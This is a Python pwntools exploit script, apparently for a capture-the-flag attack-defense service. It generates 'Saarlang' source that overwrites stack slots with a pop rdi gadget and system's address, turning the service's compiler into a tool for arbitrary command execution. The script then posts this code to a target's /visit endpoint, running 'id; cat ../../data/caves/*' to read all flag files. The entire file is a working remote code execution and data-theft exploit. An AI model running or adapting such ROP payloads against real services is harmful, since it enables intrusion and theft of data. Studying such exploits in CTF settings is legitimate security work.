from __future__ import print_function, unicode_literals
import os
import requests

os.environ['TERM'] = 'xterm'
from pwn import *

context.arch = 'amd64'

"""
var stackBytes: array byte (1024);
var stackInts: array int = stackBytes;

@132	rsp
		stackPtr (16 byte)
@129	ptr to stackPtr array
@128	rsp of fun_with_the_stack
		128x legal stack array space
		ptr to stack array
"""


def get_attack_script(command, attack_compiler=False, local=True):
	if not local and attack_compiler:
		elf = ELF('vulnbox/SaarlangCompiler')
	elif not local:
		elf = ELF('vulnbox/SchlossbergCaveServer')
	elif attack_compiler:
		elf = ELF('../../backend/cmake-build-debug/SaarlangCompiler')
	else:
		elf = ELF('../../backend/cmake-build-debug/SchlossbergCaveServer')

	# command to list of ints
	command = command.encode('utf-8') + b'\x00' * 9
	constants = []
	for i in range(0, len(command) - 8, 8):
		value = str(unpack(command[i:i + 8]))
		if value[0] == '-':
			value = '0' + value
		constants.append('stackInts@{} = {};'.format(131 + i // 8, value))

	code = '''
	eija fun_with_the_stack() gebbtserick int: {{
		var stackBytes: lischd byte (1024);
		var stackInts: lischd int = stackBytes;
		stackInts@128 = {};
		stackInts@129 = stackInts@129 + 8;
		stackInts@130 = {};
		{}
	}}
	
	eija main() gebbtserick int: {{
		var stackPtr: lischd byte(1);
		mach fun_with_the_stack();
		serick stackPtr@0;
	}}
	'''
	poprdi = list(elf.search(asm('pop rdi; ret')))[0]
	code = code.format(poprdi, elf.symbols['system'], '\n\t\t'.join(constants))
	return code


# attack the test compiler
# print(get_attack_script('id && id && id', True))
# print(get_attack_script('id && id && id', True, False))

def exploit(target, local=False):
	url = 'http://{}:9080/api'.format(target)
	# newest cave
	caveId = requests.get(url + '/caves/list').json()[-1]['id']
	# code execution - leak all flags
	attackscript = get_attack_script('id; cat ../../data/caves/*', False, local)
	response = requests.post(url + '/visit', json={"cave_id": caveId, "files": {"entry.sl": attackscript}})
	print('Status:', response.status_code)
	print(response.text)


if __name__ == '__main__':
	if len(sys.argv) > 1:
		exploit(sys.argv[1])
	else:
		exploit('localhost', True)
